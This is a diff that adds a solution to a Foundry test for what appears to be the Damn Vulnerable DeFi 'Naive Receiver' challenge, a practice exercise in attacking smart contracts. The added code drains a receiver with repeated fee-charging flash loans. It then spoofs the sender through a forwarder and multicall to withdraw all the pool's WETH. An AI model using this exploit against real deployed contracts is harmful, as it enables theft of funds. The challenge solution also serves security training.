@@ -77,7 +77,37 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        //  key: muticall will remove the last 20 bytes of msg.data
+        // result: attacker can manipulate this to spoof _msgSender() in pool contract
+        while (weth.balanceOf(address(receiver)) > 0) {
+            pool.flashLoan(receiver, address(weth), 0, bytes(""));
+        }
+
+        bytes[] memory calls = new bytes[](1);
+        bytes memory withdrawCallPool = abi.encodeWithSignature(
+            "withdraw(uint256,address)",
+            WETH_IN_POOL + WETH_IN_RECEIVER,
+            recovery
+        );
+        calls[0] = abi.encodePacked(withdrawCallPool, deployer);
+
+        bytes memory maliciousData = abi.encodeWithSignature("multicall(bytes[])", calls);
+        BasicForwarder.Request memory maliciousRequest = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: 1_000_000,
+            nonce: 0,
+            data: maliciousData,
+            deadline: block.timestamp
+        });
+        bytes32 structHash = forwarder.getDataHash(maliciousRequest);
+        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), structHash));
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        forwarder.execute{value: 0}(maliciousRequest, signature);
     }
 
     /**
